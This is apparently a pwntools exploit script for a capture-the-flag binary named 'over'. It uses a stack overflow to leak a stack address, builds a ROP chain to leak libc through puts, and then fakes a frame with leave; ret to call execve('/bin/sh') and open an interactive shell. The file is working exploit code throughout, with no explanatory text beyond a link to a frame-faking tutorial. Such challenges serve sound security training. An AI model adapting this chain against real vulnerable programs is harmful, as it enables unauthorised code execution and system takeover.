#coding=utf-8
# 原理 https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/#frame-faking
from pwn import *
context(arch = 'amd64', os = 'linux')

sh = process("./over")
pwn = ELF("./over")
libc = pwn.libc
# gdb.attach(sh, 'b puts')
puts_got = pwn.got["puts"]
puts_plt = pwn.plt["puts"]
pop_rdi_ret = 0x400793
leave_ret = 0x400721

sh.sendafter('>', 'a'*0x50)
buf_addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8, '\x00')) - 0x70
log.info("buf in stack: %x" % buf_addr)

payload = flat(['a'*8, pop_rdi_ret, puts_got, puts_plt, 0x400676, (0x50-40)*'a', buf_addr, leave_ret])
sh.sendafter('>', payload)
libc.address = u64(sh.recvuntil("\x7f")[-6:].ljust(8, '\x00')) - libc.symbols["puts"]
log.info("libc address: %x" % libc.address)

execve = libc.symbols["execve"]
bin_sh = next(libc.search("/bin/sh"))
pop_rdx_rsi_ret = libc.address + 0x107589
# buf_addr - 0x30由gdb调试得出
payload = flat(['a'*8, pop_rdi_ret, bin_sh, pop_rdx_rsi_ret, 0, 0, execve, (0x50-56)*'a', buf_addr-0x30, leave_ret])
sh.sendafter('>', payload)
sh.interactive()
